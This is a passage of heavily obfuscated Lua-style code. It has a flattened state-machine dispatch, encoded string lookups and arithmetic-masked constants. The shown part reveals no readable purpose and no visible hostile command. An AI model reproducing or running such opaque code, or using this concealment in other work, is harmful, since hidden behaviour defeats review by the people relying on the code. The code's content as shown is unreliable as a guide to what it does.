a=R(-494772-(-465565))F=z[a]C=R(924072-953410)a=z[C]C=R(13396-42734)z[C]=F C=R(-419856+390649)z[C]=a F=-54406+16512003 C=B[v[-991974-(-991975)]]y=C()else b=b+P y=b<=S p=not G y=p and y p=b>=S p=G and p y=p or y p=-589217+6223414 F=y and p y=-469355+2677251 F=F or y end else i=t F=-133768+10984634 Y=i I[i]=Y i=nil end end end end end else if F<12884534-(-683066)then if F<793342+10393861 then if F<-915035+11813287 then if F<594310+9635697 then if F<10041217-326203 then if F<8723266-(-850037)then U=-1011644+1011646 F=-676396+11756419 l=W[U]U=B[g]c=l==U J=c else y=D()P=F a=x(15064243-788939,{v[-233038+233039],v[-772343+772345],C,v[-142731+142737],v[493437+-493433]})B[y]=a a=B[y]n=B[v[-368044-(-368045)]]q=B[v[-841050-(-841052)]]T=R(-534933-(-505469))t=R(-1057967-(-1028711))o=-102+27506005652078 u=q(T,o)E=-439963+30737939852932 p=n[u]u=B[v[-641853-(-641857)]]o=B[v[820926-820925]]I=B[v[389820+-389818]]i=I(t,E)T=o[i]q=u[T]t=R(862162+-891543)o=B[v[628155-628154]]I=B[v[-181772+181774]]E=23515671875067-(-236747)i=I(t,E)I=R(-350005-(-320565))T=o[i]o=z[I]u=T..o n=q..u G=p..n S=G F=G and 17012085-848894 or 14550176-(-297263)end else if F<9204109-(-838645)then K=-217455-(-217455)t=#I F=11973485-1009203 i=t==K else q=-1017720+27018435475613 b=B[v[739823-739822]]P=B[v[901212+-901210]]G=B[v[523728-523725]]n=R(495664+-525157)p=G(n,q)S=P[p]p=R(1051-30365)y=b[S]n=722047+17809121041382 S=B[v[-515089+515091]]P=B[v[1769+-1766]]G=P(p,n)b=S[G]C=y[b]b=B[v[-983229+983231]]S=B[v[703594-703591]]G=R(977979+-1007340)p=930179+28544227541608 P=S(G,p)y=b[P]a=C[y]P=R(139344-168645)y=B[v[441823-441821]]b=B[v[783505+-783502]]G=-349717+14025997348760 S=b(P,G)C=y[S]F=a[C]F=F and 709767+14708385 or 8052727-665700 end end else if F<10153269-(-465850)then if F<29306+10350927 then d=T==o F=8254790-(-765797)E=d else C=D()F=nil y=D()n=R(571563-600997)B[C]=F F=nil B[y]=F o=R(-57018+27614)q=-1006965+14130346473256 b=B[v[-957027-(-957028)]]P=B[v[-279281-(-279283)]]G=B[v[-375790-(-375793)]]p=G(n,q)S=P[p]n=16312400935562-(-877346)p=R(-831425+801953)a=b[S]S=B[v[-152806+152808]]P=B[v[99766+-99763]]G=P(p,n)b=S[G]F=a[b]b=F F=B[v[-115642+115646]]I=23432797130372-(-744475)S=B[v[640974+-640969]]p=B[v[457467-457466]]q=B[v[-143045-(-143047)]]u=B[v[-488893-(-488896)]]T=u(o,I)n=q[T]a=R(-363910+334629)T=R(-19745-9715)G=p[n]o=12121393029434-(-783570)n=B[v[-429383+429385]]q=B[v[-1013138-(-1013141)]]u=q(T,o)a=F[a]q=621333+28689603721498 p=n[u]T=R(542185-571433)n=R(-448279+419034)P=G[p]a=a(F,S,P)S=R(-1020784-(-991352))a=z[S]P=B[v[329431+-329429]]G=B[v[-320453-(-320456)]]p=G(n,q)q=-42076+2509537061100 S=P[p]F=a[S]S=s(9804303-(-306571),{v[-52606-(-52607)],v[-1047857-(-1047859)],v[-621937+621940];y})n=R(97460-126731)a=F(S)S=R(-230493+201061)a=z[S]P=B[v[974002-974000]]G=B[v[-651491-(-651494)]]p=G(n,q)S=P[p]F=a[S]S=f(862345+8064001,{v[119740+-119739],v[167824-167822],v[-856692-(-856695)];C})a=F(S)S=R(-435227-(-405795))q=512591+24923375672070 a=z[S]P=B[v[-139932-(-139934)]]n=R(-950754-(-921553))G=B[v[-973634+973637]]p=G(n,q)S=P[p]o=15038342551510-(-99204)F=a[S]S=j(3934194-(-675225),{v[297559+-297558],v[-133052+133054],v[173004-173001]})a=F(S)G=B[v[815785-815784]]n=B[v[328036+-328034]]q=B[v[-1017273+1017276]]u=q(T,o)p=n[u]T=18273005552843-(-89202)P=G[p]p=B[v[115162-115160]]n=B[v[-171923+171926]]u=R(180767-210085)q=n(u,T)u=4155777437768-1034425 G=p[q]S=P[G]G=B[v[223173-223171]]q=R(-783858+754449)p=B[v[528982-528979]]n=p(q,u)P=G[n]n=R(-916613-(-887385))a=S[P]P=B[v[-1013565+1013567]]G=B[v[729288-729285]]q=19507060663022-524147 p=G(n,q)S=P[p]F=a[S]F=F and 1574573-(-1002378)or 3477752-(-300941)end else t=t+e Y=not H i=t<=K i=Y and i Y=t>=K Y=H and Y i=Y or i Y=8566538-(-908422)F=i and Y i=9834831-(-145935)F=F or i end end else if F<-373889+11340105 then if F<10300045-(-612239)then if F<9875974-(-1032333)then C=B[v[-111278+111279]]a=#C C=26559-26559 F=a==C F=F and 12703502-(-555480)or 3294845-839495 else a=R(-301626+272403)F=z[a]C=R(539716-569161)a=F(C)F=z[R(374689-404006)]a={}end else t=238989-238988 K=#I i=b(t,K)Y=886545+-886544 t=G(I,i)F=-124503-(-425666)K=B[o]H=t-Y e=p(H)i=nil K[t]=e t=nil end else if F<10191235-(-934093)then if F<-43023+11030937 then n=u O=R(126045-155376)d=z[O]O=R(421906+-451248)E=d[O]d=E(C,n)E=B[v[889309-889303]]O=E()F=-168422+3136473 n=nil t=d+O i=t+G t=649342+-649086 I=i%t O=621746-621745 G=I t=b[y]d=G+O E=S[d]i=t..E b[y]=i else a=J F=w F=368786+6664449 end else w=B[y]J=w F=w and-162498+1796393 or 16978134-657607 end end end else if F<654594+11852042 then if F<-260759+11945948 then if F<12360210-912060 then if F<-461919+11745475 then a={}F=z[R(148834-178180)]else F=9705768-811366 G=nil S=nil p=nil end else u=R(-119559+90233)q=z[u]F=-895514+12882573 a=q end else if F<11492416-(-621225)then if F<11586593-(-395534)then e=not K E=E+O a=E<=d a=e and a e=E>=d e=K and e a=e or a e=154556+3216495 F=a and e a=-571022+13038359 F=F or a else q=D()T=82254-82189 u=983819+-983816 B[q]=a F=B[p]a=F(u,T)F=371495-371495 u=D()T=F B[u]=a i=Z(-314493+7221819,{})I=R(-882169+852963)F=572288+-572288 a=z[I]O=R(158785+-188266)o=F I={a(i)}a=482145+-482143 F={h(I)}I=F F=I[a]a=R(814454+-843826)i=F F=z[a]t=B[b]d=z[O]O=d(i)d=R(850669-880156)E=t(O,d)t={E()}a=F(h(t))t=D()B[t]=a E=B[u]F=11428818-(-531249)d=E E=-611896-(-611897)a=-253613+253614 O=E E=-573015+573015 K=O<E E=a-O end else d=B[y]F=d and 10874331-507584 or-606551+9627138 E=d end end else if F<-850153+13905888 then if F<12022957-(-713553)then if F<11858361-(-792326)then F=z[R(684609+-714066)]a={}else F=-880229+3928485 end else F=B[v[278357-278350]]F=F and 15128623-(-178643)or 8335678-948986 end else if F<12461530-(-977653)then if F<13367380-108851 then I=R(537409-566800)o=z[I]I=R(-880794+851468)F=14586371-(-380545)T=o[I]q=T else b=1008198-1008069 y=B[v[-669914-(-669916)]]C=y*b y=-563634+8988238195211 a=C+y C=-521909+35184372610741 y=-1009581-(-1009582)F=a%C B[v[201893-201891]]=F C=B[v[638775-638772]]F=2485184-(-740818)a=C~=y end else K=-535824+535830 O=-635834+635835 F=B[p]d=F(O,K)K=R(-988320-(-959113))F=R(670855+-700062)z[F]=d O=z[K]K=-777682+777684 F=O>K F=F and-764094+2622453 or 2253771-(-787054)end end end end else if F<-532921+15478065 then if F<14145598-(-302289)then if F<-183494+14306054 then if F<13841791-73699 then if F<289411+13399748 then a=R(868871+-898243)S=R(-498398+468917)F=z[a]C=B[v[-365221+365225]]n=R(1027087+-1056293)b=z[S]q=j(117213+3159952,{})p=z[n]n={p(q)}G={h(n)}p=1020769+-1020767 P=G[p]S=b(P)b=R(-286298-(-256811))y=C(S,b)C={y()}a=F(h(C))y=B[v[883582-883577]]C=a F=y and 6947393-121588 or 16165782-101842 a=y else a=R(905186+-934460)P=R(-735845-(-706446))F=z[a]G=9834320374965-416466 y=B[v[352562+-352561]]b=B[v[238483-238481]]S=b(P,G)P=R(950087+-979550)C=y[S]a=R(-1071693-(-1042207))a=F[a]G=34243376994169-923952 a=a(F,C)F=R(372401-401857)y=B[v[945719-945718]]b=B[v[-551703-(-551705)]]F=a[F]S=b(P,G)G=10940140912602-764916 P=R(172458+-201777)C=y[S]F=F(a,C)y=B[v[606945-606944]]b=B[v[694745+-694743]]S=b(P,G)C=y[S]G=10043026486662-844610 a=R(700388+-729844)a=F[a]a=a(F,C)P=R(-1055895-(-1026588))y=B[v[-492704-(-492705)]]F=R(406751-436207)b=B[v[-498012+498014]]S=b(P,G)F=a[F]C=y[S]F=F(a,C)a=R(147834-177290)y=B[v[800086+-800085]]b=B[v[-447287+447289]]P=R(-935632-(-906295))a=F[a]G=-207624+31185376437185 S=b(P,G)C=y[S]G=96101+9420350560701 a=a(F,C)P=R(-780672-(-751228))y=B[v[-736790-(-736791)]]F=R(-636806+607350)b=B[v[-733323+733325]]F=a[F]S=b(P,G)C=y[S]P=R(711316+-740746)F=F(a,C)y=B[v[-547959+547960]]G=-699311+33453286484104 b=B[v[-714896-(-714898)]]a=R(983384+-1012840)S=b(P,G)C=y[S]a=F[a]a=a(F,C)P=R(-426730+397305)G=18756230748100-(-35418)y=B[v[348327-348326]]F=R(866481+-895937)b=B[v[-342752-(-342754)]]F=a[F]S=b(P,G)C=y[S]F=F(a,C)G=33310275653961-(-43854)y=B[v[115760+-115759]]P=R(31428+-60795)b=B[v[937444-937442]]S=b(P,G)G=1039348+16707623289456 a=R(169687+-199143)P=R(-749986+720686)C=y[S]a=F[a]a=a(F,C)y=B[v[70176+-70175]]b=B[v[469788-469786]]F=R(-960647+931191)S=b(P,G)C=y[S]G=670799852300-422356 F=a[F]P=R(200085-229504)F=F(a,C)y=B[v[176677+-176676]]b=B[v[-444347+444349]]S=b(P,G)C=y[S]a=R(-731646-(-702190))G=18359402326259-(-571506)P=R(-652139+622729)a=F[a]a=a(F,C)F=R(-40793-(-11337))y=B[v[603338+-603337]]b=B[v[-745624+745626]]F=a[F]S=b(P,G)C=y[S]G=18757115615905-(-558973)F=F(a,C)y=B[v[393275+-393274]]P=R(-199928-(-170580))b=B[v[-955459-(-955461)]]a=R(681477-710933)a=F[a]S=b(P,G)C=y[S]a=a(F,C)F=R(561472-590928)F=a[F]y=B[v[461339+-461338]]G=776481+13489701388136 b=B[v[529744-529742]]P=R(-1015075+985782)S=b(P,G)G=572719+312577098594 C=y[S]F=F(a,C)P=R(-255658-(-226152))y=B[v[-24191+24192]]a=R(-284654+255198)b=B[v[-258520-(-258522)]]a=F[a]S=b(P,G)C=y[S]a=a(F,C)F=R(869475-898931)G=902167+18685603569126 y=B[v[616512+-616511]]F=a[F]b=B[v[-552694+552696]]P=R(-597842+568393)S=b(P,G)C=y[S]P=R(242075-271584)F=F(a,C)y=B[v[46522+-46521]]b=B[v[603713-603711]]G=466476+25914351358199 S=b(P,G)C=y[S]a=R(-163479+134023)a=F[a]a=a(F,C)F=R(-312093-(-282603))F=a[F]F=F(a)F=z[R(951110+-980330)]a={}end else if F<14066024-145441 then P=R(286271-315752)S=z[P]t=R(-1042141+1012909)u=B[v[258055-258054]]o=B[v[374266-374264]]I=B[v[787412-787409]]E=16755433626867-(-1016199)i=I(t,E)T=o[i]F=-835920+3402314 q=u[T]i=R(-28094-1219)T=B[v[340139+-340137]]o=B[v[937356-937353]]t=32845759953451-(-393620)I=o(i,t)u=T[I]I=R(156715+-186060)n=q[u]u=B[v[-656357-(-656359)]]T=B[v[-177409+177412]]i=-22553+29626613566972 o=T(I,i)q=u[o]I=-432759+25685884995887 o=R(-65048-(-35776))p=n[q]q=B[v[1002695+-1002693]]u=B[v[757111+-757108]]T=u(o,I)n=q[T]G=p[n]P=S(G)y=P else F=true B[v[616095+-616094]]=F F=z[R(-637373-(-607912))]a={}end end else if F<14398673-(-30507)then if F<-650634+14987810 then a=R(745273-774661)C=Q[-427866-(-427867)]i=5552182443826-636185 F=z[a]S=B[v[993921+-993920]]I=R(-798676-(-769367))p=R(363807-393109)P=B[v[565040+-565038]]n=13099944308433-87805 G=P(p,n)b=S[G]n=B[v[1027690-1027687]]u=B[v[-584537-(-584538)]]T=B[v[-561353-(-561355)]]d=R(976138+-1005356)o=T(I,i)I=442906+19793718878695 q=u[o]o=R(-981586+952076)p=n[q]q=B[v[-222495-(-222496)]]u=B[v[918347-918345]]T=u(o,I)o=11225847842630-29403 n=q[T]G=p[n]n=B[v[-811782-(-811783)]]q=B[v[732073+-732071]]T=R(551971+-581291)u=q(T,o)p=n[u]P=G[p]p=B[v[136838-136837]]t=29897828135280-(-263410)n=B[v[-360020+360022]]T=22259806576896-440451 O=-514364+24684201149986 u=R(-182541-(-153135))q=n(u,T)G=p[q]S=P[G]u=20464519750116-998571 I=R(671157-700534)q=R(-728020+698766)G=B[v[846602+-846601]]p=B[v[-566231-(-566233)]]T=666379+29585250060997 n=p(q,u)P=G[n]e=R(-471016-(-441805))p=B[v[1037039-1037038]]u=R(93220+-122420)n=B[v[-557180-(-557182)]]q=n(u,T)G=p[q]H=1040883+22757925603186 n=B[v[-826279+826280]]q=B[v[-920483-(-920485)]]T=R(926857-956133)o=5832551137507-931400 u=q(T,o)p=n[u]i=-985326+33954221901489 u=B[v[-708650-(-708651)]]T=B[v[1000117+-1000115]]o=T(I,i)q=u[o]T=B[v[-770637+770638]]i=R(68467+-97893)o=B[v[-644500-(-644502)]]I=o(i,t)u=T[I]n={[q]=u}u=B[v[-737350+737351]]I=R(79199+-108520)T=B[v[-683218-(-683220)]]i=-519994+24518155213779 o=T(I,i)q=u[o]T=R(-463667-(-434378))u=B[v[1029425+-1029421]]i=B[v[973591-973590]]t=B[v[-803029+803031]]E=t(d,O)I=i[E]t=B[v[625089+-625084]]d=B[v[974153-974152]]O=B[v[266293-266291]]K=O(e,H)E=d[K]i=t[E]E=B[v[116563-116562]]K=R(94614+-124045)T=u[T]d=B[v[-572465+572467]]e=-428610+13300976820851 O=d(K,e)t=E[O]o={[I]=i,[t]=C}C=nil T=T(u,o)y={[b]=S;[P]=G,[p]=n,[q]=T}a=F(y)F=z[R(640436-669785)]a={}else G=B[P]F=16628109-559780 a=G end else a=R(132294-161568)F=z[a]G=33003508562806-(-98450)P=R(181224-210476)a=R(776621-806107)a=F[a]y=B[v[386968-386966]]b=B[v[969128+-969125]]S=b(P,G)C=y[S]a=a(F,C)y=B[v[-897415+897417]]b=B[v[-542802-(-542805)]]G=21610005836692-216134 P=R(282241+-311499)S=b(P,G)G=15356433707489-415219 C=y[S]F=R(-544537-(-515081))u=R(-158447+129068)F=a[F]F=F(a,C)y=B[v[181315+-181313]]P=R(-988875+959672)b=B[v[-692317-(-692320)]]S=b(P,G)a=R(-633582+604126)C=y[S]a=F[a]G=788588+23201553670600 a=a(F,C)y=B[v[552157+-552155]]P=R(643978-673400)T=-695507+34851548404792 b=B[v[687801-687798]]S=b(P,G)G=25813227427259-911047 C=y[S]F=R(-58281+28825)F=a[F]F=F(a,C)P=R(453660+-483000)y=B[v[1032588-1032586]]b=B[v[557966-557963]]S=b(P,G)a=R(-677060-(-647604))C=y[S]a=F[a]P=R(1004877+-1034132)a=a(F,C)y=B[v[450249+-450247]]G=-1026836+25409715558732 b=B[v[490094+-490091]]F=R(744214+-773670)S=b(P,G)P=R(-179541+150216)F=a[F]C=y[S]F=F(a,C)y=B[v[184966+-184964]]b=B[v[-697334+697337]]G=279681+30212822332019 S=b(P,G)a=R(631909-661365)C=y[S]G=29528086018491-(-162811)a=F[a]a=a(F,C)P=R(463849-493215)y=B[v[378082-378080]]b=B[v[-863799+863802]]S=b(P,G)C=y[S]G=31527946377850-8481 P=R(1006484-1035972)F=R(20663+-50119)F=a[F]F=F(a,C)y=B[v[804622+-804620]]b=B[v[-319535+319538]]S=b(P,G)a=R(-397197-(-367741))a=F[a]C=y[S]P=R(1045519+-1074995)a=a(F,C)G=18795153759828-457764 y=B[v[509162+-509160]]b=B[v[-527066+527069]]S=b(P,G)F=R(539767-569223)G=30904334081931-(-6315)C=y[S]F=a[F]F=F(a,C)P=R(838018+-867264)y=B[v[275158+-275156]]b=B[v[-100614+100617]]S=b(P,G)a=R(612929-642385)P=R(924209-953591)a=F[a]C=y[S]a=a(F,C)y=B[v[-183012-(-183014)]]G=32088418616741-(-1045689)b=B[v[-120108+120111]]S=b(P,G)C=y[S]P=R(-583308-(-554045))F=R(474399+-503855)F=a[F]F=F(a,C)y=B[v[-292319+292321]]b=B[v[446081-446078]]G=33063367826118-(-729438)a=R(87196-116652)a=F[a]S=b(P,G)G=34790119431120-400520 C=y[S]a=a(F,C)y=B[v[-947283+947285]]P=R(-26506-2991)b=B[v[578515+-578512]]S=b(P,G)C=y[S]F=R(-1071474-(-1042018))F=a[F]G=10594345959662-159145 F=F(a,C)P=R(512483+-541798)y=B[v[-62591-(-62593)]]b=B[v[95480-95477]]S=b(P,G)a=R(-762182+732726)C=y[S]a=F[a]S=R(737005-766433)P=-662199+5353101681779 a=a(F,C)C=B[v[311632+-311630]]y=B[v[928192-928189]]b=y(S,P)F=C[b]P=B[v[-217538-(-217539)]]p=B[v[-465729+465731]]n=B[v[-951051+951054]]q=n(u,T)G=p[q]S=P[G]G=B[v[1036668+-1036666]]q=R(-805564+776287)p=B[v[-751665-(-751668)]]u=-221477+22572394170932 n=p(q,u)P=G[n]b=S[P]P=B[v[23474+-23472]]G=B[v[-590402+590405]]n=R(-841668-(-812225))q=-822846+16150285511582 p=G(n,q)S=P[p]y=b[S]S=B[v[354172-354170]]n=-773276+9584342736395 P=B[v[-718315-(-718318)]]p=R(509944+-539243)G=P(p,n)b=S[G]C=y[b]a[F]=C F=-897716+1947741 end end else if F<581085+14186549 then if F<161554+14590703 then if F<-280381+14891160 then F=true b=R(198965+-228296)y=D()B[y]=F S=D()C=Q a=z[b]b=R(136789+-166197)P=D()F=a[b]b=D()n=x(13529158-(-525965),{P})B[b]=F F=x(-104720+11013609,{})B[S]=F F=false B[P]=F p=R(-642707-(-613501))G=z[p]p=G(n)a=p F=p and 941990+13466515 or 16146207-77878 else F=15821432-970856 end else a=R(-19199-10083)C=Q[853929-853928]F=B[v[509512-509511]]y=Q[173865+-173863]a=F[a]a=a(F,C)S=a a=B[v[-687295+687297]]b=Q[505671+-505668]F=S==a F=F and 7451007-(-752429)or-571901+5217673 end else if F<15215537-275496 then if F<15595545-746614 then p=B[v[-875909-(-875910)]]T=16819606315852-509108 u=R(496248-525443)n=B[v[-157942+157944]]q=n(u,T)G=p[q]S=G F=-854820+17018011 else T=nil i=nil q=k(q)i=-480912+480913 o=nil p=k(p)u=k(u)S=k(S)y=k(y)P=k(P)b=k(b)b=nil I=nil y=nil t=k(t)n=nil F=267013+10583853 S=D()G=nil B[S]=y q=R(-257294-(-227963))y=D()B[y]=b G=R(-773586+744085)p=R(-798734+769233)P=z[G]G=R(-956988-(-927744))b=P[G]n=R(994925-1024316)P=D()B[P]=b G=z[p]p=R(-571567+542084)b=G[p]p=z[n]n=R(-172856+143644)G=p[n]n=z[q]q=R(-201175+171690)p=n[q]n=-658709-(-658709)T={}q=D()B[q]=n t=307664+-307408 n=354743+-354741 u=D()B[u]=n n={}o=D()K=t B[o]=T I={}T=580032-580032 t=-497851-(-497852)e=t t=473679+-473679 H=e<t t=i-e end else y=Q[-996364-(-996366)]F=B[v[599417-599416]]b=F F=b[y]F=F and 1718602-390961 or 594515+907142 C=Q[-123421-(-123422)]end end end else if F<15723239-(-213217)then if F<14808246-(-507319)then if F<-571892+15753933 then if F<14712812-(-235503)then C=R(-232793+203519)a=z[C]C=R(261431+-290917)b=B[v[-291657-(-291659)]]S=B[v[995364-995361]]p=33472121292917-(-701549)G=R(333110-362584)P=S(G,p)p=3323079774665-658366 C=a[C]y=b[P]C=C(a,y)b=B[v[311944+-311942]]S=B[v[-597874-(-597877)]]G=R(-922731+893427)P=S(G,p)G=R(761207+-790659)y=b[P]a=R(-456854+427398)a=C[a]a=a(C,y)b=B[v[659207+-659205]]C=R(-239436-(-209980))S=B[v[823547-823544]]p=9855737191249-(-489116)P=S(G,p)y=b[P]C=a[C]p=15672272727693-70156 C=C(a,y)b=B[v[349845+-349843]]G=R(212346-241699)a=R(609173+-638629)S=B[v[-535132+535135]]P=S(G,p)a=C[a]y=b[P]G=R(-207670-(-178179))a=a(C,y)b=B[v[165448+-165446]]p=26509909749142-376158 S=B[v[-672126-(-672129)]]P=S(G,p)p=19838640732349-562343 C=R(-666705-(-637249))y=b[P]G=R(1035358+-1064723)C=a[C]C=C(a,y)a=R(147208-176664)b=B[v[-700677-(-700679)]]S=B[v[230595-230592]]a=C[a]P=S(G,p)G=R(-141849-(-112574))y=b[P]a=a(C,y)p=12002769065066-294549 C=R(-973589+944133)b=B[v[-48625+48627]]S=B[v[354149+-354146]]P=S(G,p)C=a[C]y=b[P]C=C(a,y)b=B[v[-992622+992624]]a=R(-1040873-(-1011417))S=B[v[-612117+612120]]p=30824769257011-(-96734)a=C[a]G=R(-556959-(-527494))P=S(G,p)y=b[P]a=a(C,y)p=-689805+18069969135467 G=R(913336-942774)b=B[v[-90312-(-90314)]]S=B[v[914270+-914267]]P=S(G,p)G=R(-798947-(-769444))C=R(899772-929228)C=a[C]p=-790948+20454659503832 y=b[P]C=C(a,y)b=B[v[-237747-(-237749)]]S=B[v[98830-98827]]a=R(494131-523587)P=S(G,p)a=C[a]y=b[P]a=a(C,y)p=28644862513585-957847 b=B[v[862598-862596]]C=R(-582231-(-552775))S=B[v[-614610+614613]]G=R(-128184-(-98980))P=S(G,p)y=b[P]C=a[C]C=C(a,y)a=R(-582169+552713)b=B[v[667893+-667891]]p=755666+8135358318330 S=B[v[-407317+407320]]a=C[a]G=R(-723121+693668)P=S(G,p)y=b[P]a=a(C,y)G=R(179371+-208830)p=11531298360386-46921 b=B[v[645883+-645881]]S=B[v[35597-35594]]P=S(G,p)C=R(281252-310708)C=a[C]y=b[P]C=C(a,y)G=R(936499-965910)b=B[v[-823780-(-823782)]]p=431665+19824809709022 S=B[v[-611621-(-611624)]]a=R(-492176+462720)a=C[a]P=S(G,p)y=b[P]p=12226746273250-(-428123)G=R(-14317+-15104)a=a(C,y)C=R(-562892+533436)b=B[v[-34919+34921]]S=B[v[161374+-161371]]P=S(G,p)C=a[C]p=20339704137321-909674 y=b[P]C=C(a,y)b=B[v[-937264+937266]]S=B[v[-488334-(-488337)]]G=R(215128+-244362)P=S(G,p)a=R(213950+-243406)a=C[a]y=b[P]a=a(C,y)b=B[v[427694+-427692]]S=B[v[-1011160-(-1011163)]]p=471112+4308015011726 C=R(-892512-(-863056))G=R(956358+-985694)P=S(G,p)C=a[C]G=358871+25382417544276 y=b[P]p=4203221383664-504395 C=C(a,y)P=R(325897-355138)y=B[v[461341-461339]]b=B[v[-207869+207872]]S=b(P,G)a=y[S]F=C[a]n=29755807123524-594468 B[v[546800-546796]]=F C=R(447704+-476978)a=z[C]G=R(-99159-(-69711))b=B[v[-902872+902874]]C=R(-353219+323733)S=B[v[-63810-(-63813)]]C=a[C]P=S(G,p)y=b[P]F=967211+10265326 C=C(a,y)b=B[v[-397742+397744]]S=B[v[-662365+662368]]G=R(-753635+724366)p=10053281323324-83699 P=S(G,p)p=-987506+7011269140018 a=R(908838-938294)y=b[P]a=C[a]a=a(C,y)G=R(-711438-(-682035))b=B[v[1005562-1005560]]C=R(529825-559281)S=B[v[-8297+8300]]P=S(G,p)p=225834+3714859439255 C=a[C]y=b[P]C=C(a,y)b=B[v[-174735-(-174737)]]G=R(-944401+915103)S=B[v[210564-210561]]P=S(G,p)a=R(-597321-(-567865))a=C[a]p=6118231575232-(-262241)G=R(-612630-(-583325))y=b[P]a=a(C,y)C=R(622906-652362)b=B[v[674389+-674387]]S=B[v[880095-880092]]P=S(G,p)y=b[P]C=a[C]p=264719+23766702530860 C=C(a,y)b=B[v[-257943+257945]]S=B[v[937147-937144]]G=R(-400915-(-371423))P=S(G,p)y=b[P]a=R(-385187-(-355731))a=C[a]a=a(C,y)t=4468718445005-973229 b=B[v[837884+-837882]]p=-746043+1376248652987 S=B[v[-416171-(-416174)]]C=R(-315998-(-286542))G=R(828659+-858086)C=a[C]P=S(G,p)p=560472929011-(-347665)y=b[P]G=R(595026-624323)C=C(a,y)b=B[v[1021884+-1021882]]a=R(-539451-(-509995))S=B[v[-456254+456257]]P=S(G,p)y=b[P]a=C[a]a=a(C,y)G=R(-929231+899763)p=839487+14268214414005 b=B[v[121561+-121559]]S=B[v[1032570-1032567]]C=R(-855439-(-825983))P=S(G,p)p=230215+3885784712138 G=R(-8522-20873)C=a[C]y=b[P]C=C(a,y)b=B[v[-956935+956937]]S=B[v[-700816-(-700819)]]P=S(G,p)y=b[P]a=R(-567974+538518)a=C[a]a=a(C,y)b=B[v[-744833+744835]]p=13690298523445-280142 S=B[v[1013239-1013236]]G=R(-419792+390400)P=S(G,p)y=b[P]C=R(219153+-248609)C=a[C]C=C(a,y)G=R(217537-246815)b=B[v[-67568+67570]]a=R(-570606+541150)a=C[a]p=7474105000888-448032 S=B[v[33202-33199]]P=S(G,p)y=b[P]G=R(-364448+335201)a=a(C,y)b=B[v[925748-925746]]p=61429367467-688783 S=B[v[-124983+124986]]P=S(G,p)C=R(653498+-682954)y=b[P]C=a[C]C=C(a,y)b=B[v[584861+-584859]]p=11978048866066-717129 G=R(-606147+576734)S=B[v[-29993-(-29996)]]a=R(-744858+715402)a=C[a]P=S(G,p)G=R(547708-577062)y=b[P]a=a(C,y)p=10797183276594-(-392561)C=R(382387+-411843)b=B[v[752113+-752111]]S=B[v[-582808-(-582811)]]P=S(G,p)y=b[P]C=a[C]C=C(a,y)G=R(1018164+-1047369)i=R(-841146+811650)a=R(384-29840)b=B[v[627964-627962]]S=B[v[-967700-(-967703)]]p=9917165750696-(-608354)P=S(G,p)y=b[P]a=C[a]a=a(C,y)G=R(347987+-377260)p=27650320820603-14128 b=B[v[1040975-1040973]]C=R(-1026912-(-997456))S=B[v[-851311-(-851314)]]P=S(G,p)C=a[C]y=b[P]G=848132+2122720105176 P=R(619593+-648903)C=C(a,y)p=R(-421450+392057)y=B[v[-121054+121056]]b=B[v[-175944-(-175947)]]S=b(P,G)a=y[S]S=B[v[218746+-218744]]P=B[v[416084+-416081]]G=P(p,n)b=S[G]P=R(554529+-584010)S=z[P]q=B[v[831473+-831472]]T=B[v[-1004697-(-1004699)]]o=B[v[-1005871-(-1005874)]]I=o(i,t)u=T[I]I=R(-898219+868802)n=q[u]u=B[v[592885+-592883]]i=32947489362692-(-944362)T=B[v[389580-389577]]o=T(I,i)q=u[o]p=n[q]q=B[v[786769-786767]]u=B[v[-930557-(-930560)]]o=R(82380-111617)I=748970+12641402120532 T=u(o,I)n=q[T]G=p[n]P=S(G)y=b..P C[a]=y else F=u a=q F=q and 11208742-(-778317)or 11053206-(-473185)end else C=R(362732-391955)F=z[C]b=-678357-(-678357)y=B[v[107819+-107811]]C=F(y,b)F=7104234-(-282458)end else if F<-909933+16430824 then if F<15954965-527424 then G=R(904501-933699)C=R(621100-650374)a=z[C]b=B[v[-17325-(-17327)]]S=B[v[394414+-394411]]C=R(510085-539571)p=17731765854876-541276 C=a[C]P=S(G,p)y=b[P]p=28487629243440-397407 G=R(-256763-(-227468))C=C(a,y)b=B[v[593461+-593459]]S=B[v[-835761-(-835764)]]P=S(G,p)p=9064283296281-(-261731)y=b[P]a=R(-410485-(-381029))a=C[a]a=a(C,y)b=B[v[87803-87801]]C=R(836105-865561)G=R(676816-706274)C=a[C]S=B[v[-985818+985821]]P=S(G,p)y=b[P]C=C(a,y)G=R(-942213+912952)p=10239484172176-(-670480)b=B[v[-247092-(-247094)]]S=B[v[975022+-975019]]P=S(G,p)a=R(816896-846352)G=R(-209842-(-180401))a=C[a]p=21262060442599-27963 y=b[P]a=a(C,y)b=B[v[-926823-(-926825)]]S=B[v[70242-70239]]P=S(G,p)C=R(652251+-681707)y=b[P]C=a[C]p=438577+3657550714230 C=C(a,y)b=B[v[-852653+852655]]a=R(721044+-750500)G=R(-841545+812332)S=B[v[-392084+392087]]a=C[a]P=S(G,p)y=b[P]a=a(C,y)G=R(998661-1028029)b=B[v[-207749+207751]]C=R(-285883-(-256427))p=15648120685407-(-432407)S=B[v[-645898-(-645901)]]P=S(G,p)C=a[C]y=b[P]p=304517+25504056641759 G=R(-775149-(-745798))C=C(a,y)b=B[v[-621107-(-621109)]]S=B[v[890978-890975]]a=R(456460+-485916)a=C[a]P=S(G,p)G=R(391666+-420893)y=b[P]a=a(C,y)b=B[v[-616928+616930]]p=35126584990919-597218 S=B[v[579929-579926]]C=R(564493+-593949)P=S(G,p)p=33334122044235-466601 C=a[C]G=R(852525-881980)y=b[P]C=C(a,y)b=B[v[-4611-(-4613)]]S=B[v[554698-554695]]a=R(256800-286256)P=S(G,p)p=33561662603895-(-326293)a=C[a]y=b[P]a=a(C,y)b=B[v[388766-388764]]G=R(146867-176103)S=B[v[-107513+107516]]C=R(735687+-765143)P=S(G,p)y=b[P]G=R(645648+-674881)p=8930450681348-761286 C=a[C]C=C(a,y)b=B[v[991049+-991047]]S=B[v[1019655-1019652]]a=R(1001120-1030576)a=C[a]P=S(G,p)y=b[P]G=R(378490-407837)a=a(C,y)b=B[v[-959292+959294]]p=4848149466828-689659 S=B[v[699604+-699601]]P=S(G,p)G=R(-884332+855062)y=b[P]C=R(636637+-666093)C=a[C]C=C(a,y)b=B[v[321931+-321929]]S=B[v[-138854+138857]]p=40071+18687583487351 P=S(G,p)p=-825700+2704377650767 